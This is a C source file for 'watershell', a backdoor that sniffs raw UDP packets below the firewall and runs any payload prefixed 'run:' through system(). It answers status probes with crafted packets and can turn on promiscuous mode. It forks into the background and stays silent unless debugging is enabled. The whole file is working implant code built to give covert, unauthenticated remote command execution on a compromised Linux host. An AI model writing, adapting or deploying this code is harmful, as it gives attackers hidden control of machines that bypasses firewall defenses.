/*
 * =====================================================================================
 *
 *       Filename:  watershell.c
 *
 *    Description:  run commands through a firewall... yeeaaa
 *
 *        Version:  1.0
 *        Created:  07/01/2015 09:10:41 AM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Jaime Geiger, jmg2967@rit.edu
 *
 * =====================================================================================
 */

/* CUSTOMIZE THESE LINES FOR HARD CODED VALUES */
#ifndef IFACE
#define IFACE "eth0"
#endif
#ifndef PORT
#define PORT 12345
#endif
#ifndef PROMISC
#define PROMISC false
#endif
#ifndef DEBUG
#define DEBUG false
#endif
/* COMMAND LINE ARGS WILL OVERRIDE THESE */

#include <net/if.h>
#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/filter.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <signal.h>
#include <stdbool.h>
#include "watershell.h"

//these need to be global so that a sigint can close everything up
int sockfd;
struct ifreq *sifreq;
bool promisc;

int main(int argc, char *argv[])
{
    int i, n, hlen, arg;
    struct sock_fprog filter;
    char buf[2048];
    unsigned char *read;
    char *udpdata, *iface = IFACE;
    struct iphdr *ip;
    struct udphdr *udp;
    unsigned port = PORT;
    int code = 0;

    if (fork())
        exit(1);

    promisc = PROMISC;

    // command line args
    while ((arg = getopt(argc, argv, "phi:l:")) != -1){
        switch (arg){
            case 'i':
                iface = optarg;
                break;
            case 'p':
                if (DEBUG)
                    puts("Running in promisc mode");
                promisc = true;
                break;
            case 'h':
                if (DEBUG)
                    fprintf(stderr, "Usage: %s [-l port] [-p] -i iface\n", argv[0]);
                return 0;
                break;
            case 'l':
                port += strtoul(optarg, NULL, 10);
                if (port <= 0 || port > 65535){
                    if (DEBUG)
                        puts("Invalid port");
                    return 1;
                }
                break;
            case '?':
                if (DEBUG)
                    fprintf(stderr, "Usage: %s [-l port] [-p] -i iface\n", argv[0]);
                return 1;
            default:
                abort();
        }
    }

    // replace the port in the existing filter
    bpf_code[5].k = port;
    bpf_code[7].k = port;
    bpf_code[15].k = port;
    bpf_code[17].k = port;

    /* startup a raw socket, gets raw ethernet frames containing IP packets
     * directly from the interface, none of this AF_INET shit
     */
    sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (sockfd < 0){
        if (DEBUG) perror("socket");
        return 1;
    }

    /* setup ifreq struct and SIGINT handler
     * make sure we can issue an ioctl to the interface
     */
    sifreq = malloc(sizeof(struct ifreq));
    signal(SIGINT, sigint);
    strncpy(sifreq->ifr_name, iface, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFFLAGS, sifreq) == -1){
        if (DEBUG) perror("ioctl SIOCGIFFLAGS");
        close(sockfd);
        free(sifreq);
        return 0;
    }

    //set up promisc mode if enabled
    if (promisc){
        sifreq->ifr_flags |= IFF_PROMISC;
        if (ioctl(sockfd, SIOCSIFFLAGS, sifreq) == -1)
            if (DEBUG) perror("ioctl SIOCSIFFLAGS");
    }

    //apply the packet filter code to the socket
    filter.len = 20;
    filter.filter = bpf_code;
    if (setsockopt(sockfd, SOL_SOCKET, SO_ATTACH_FILTER,
                   &filter, sizeof(filter)) < 0)
        if (DEBUG) perror("setsockopt");

    //sniff forever!
    for (;;){
        memset(buf, 0, 2048);
        //get a packet, and tear it apart, look for keywords
        n = recvfrom(sockfd, buf, 2048, 0, NULL, NULL);
        ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
        udp = (struct udphdr *)(buf + ip->ihl*4 + sizeof(struct ethhdr));
        udpdata = (char *)((buf + ip->ihl*4 + 8 + sizeof(struct ethhdr)));
        //run a command if the data is prefixed with run:
        if (!strncmp(udpdata, "run:", 4))
            code = system(udpdata + 4); //replace with fork + exec
        //checkup on the service, make sure it is still there
        if(!strncmp(udpdata, "status", 6))
            send_status(buf, code);
    }
    return 0;
}

//cleanup on SIGINT
void sigint(int signum){
    //if promiscuous mode was on, turn it off
    if (promisc){
        if (ioctl(sockfd, SIOCGIFFLAGS, sifreq) == -1){
            if (DEBUG) perror("ioctl GIFFLAGS");
        }
        sifreq->ifr_flags ^= IFF_PROMISC;
        if (ioctl(sockfd, SIOCSIFFLAGS, sifreq) == -1){
            if (DEBUG) perror("ioctl SIFFLAGS");
        }
    }
    //shut it down!
    free(sifreq);
    close(sockfd);
    exit(1);
}

//send a reply
void send_status(unsigned char *buf, int code){
    struct udpframe frame;
    struct sockaddr_ll saddrll;
    struct sockaddr_in sin;
    int len = snprintf(NULL, 0, "%d", code);
    char *prefix = "LISTENING: ";
    char *ccode = (char*)calloc(1, len+1);
    char *data = calloc(1, strlen(prefix)+len+2);

    //setup the data
    memset(&frame, 0, sizeof(frame));
    snprintf(ccode, len+1, "%d", code);
    strncpy(data, prefix, strlen(prefix));
    strncat(data, ccode, len+1);
    strncat(data, "\n", 1);
    strncpy(frame.data, data, strlen(data));

    //get the ifindex
    if (ioctl(sockfd, SIOCGIFINDEX, sifreq) == -1){
        if (DEBUG) perror("ioctl SIOCGIFINDEX");
        return;
    }

    //layer 2
    saddrll.sll_family = PF_PACKET;
    saddrll.sll_ifindex = sifreq->ifr_ifindex;
    saddrll.sll_halen = ETH_ALEN;
    memcpy((void*)saddrll.sll_addr, (void*)(((struct ethhdr*)buf)->h_source), ETH_ALEN);
    memcpy((void*)frame.ehdr.h_source, (void*)(((struct ethhdr*)buf)->h_dest), ETH_ALEN);
    memcpy((void*)frame.ehdr.h_dest, (void*)(((struct ethhdr*)buf)->h_source), ETH_ALEN);
    frame.ehdr.h_proto = htons(ETH_P_IP);

    //layer 3
    frame.ip.version = 4;
    frame.ip.ihl = sizeof(frame.ip)/4;
    frame.ip.id = htons(69);
    frame.ip.frag_off |= htons(IP_DF);
    frame.ip.ttl = 64;
    frame.ip.tos = 0;
    frame.ip.tot_len = htons(sizeof(frame.ip) + sizeof(frame.udp) + strlen(data));
    frame.ip.saddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->daddr;
    frame.ip.daddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->saddr;
    frame.ip.protocol = IPPROTO_UDP;

    //layer 4
    frame.udp.source = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->dest;
    frame.udp.dest = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->source;
    frame.udp.len = htons(strlen(data) + sizeof(frame.udp));

    //checksums
    //udp_checksum(&frame.ip, (unsigned short*)&frame.udp);
    ip_checksum(&frame.ip);

    //calculate total length and send
    len = sizeof(struct ethhdr) + sizeof(struct udphdr) + sizeof(struct iphdr) + strlen(data);
    sendto(sockfd, (char*)&frame, len, 0, (struct sockaddr *)&saddrll, sizeof(saddrll));

    //cleanup
    free(ccode);
    free(data);
}

/* checksum functions from http://www.roman10.net/how-to-calculate-iptcpudp-checksumpart-2-implementation/ */
//broken.
void udp_checksum(struct iphdr *ip, unsigned short *payload){
    register unsigned long sum = 0;
    struct udphdr *udp = (struct udphdr*)payload;
    unsigned short len = udp->len;
    unsigned short *addr = (short*)ip;
    udp->check = 0;
    sum += (ip->daddr>>16) & 0xFFFF;
    sum += (ip->daddr) & 0xFFFF;
    sum += htons(IPPROTO_UDP);
    sum += ntohs(udp->len);
    while (len > 1){
        sum += *addr++;
        len -= 2;
    }
    if (len > 0)
        sum += ((*addr) & htons(0xFFFF));
    while (sum>>16)
        sum = (sum & 0xFFFF) + (sum >>16);
    sum = ~sum;
    udp->check = ((unsigned short)sum == 0x0000) ? 0xFFFF : (unsigned short)sum;
}

void ip_checksum(struct iphdr *ip){
    unsigned int count = ip->ihl<<2;
    unsigned short *addr = (short*)ip;
    register unsigned long sum = 0;

    ip->check = 0;
    while (count > 1){
        sum += *addr++;
        count -= 2;
    }
    if (count > 0)
        sum += ((*addr) & htons(0xFFFF));
    while (sum>>16)
        sum = (sum & 0xFFFF) + (sum >>16);
    sum = ~sum;
    ip->check = (unsigned short)sum;
}
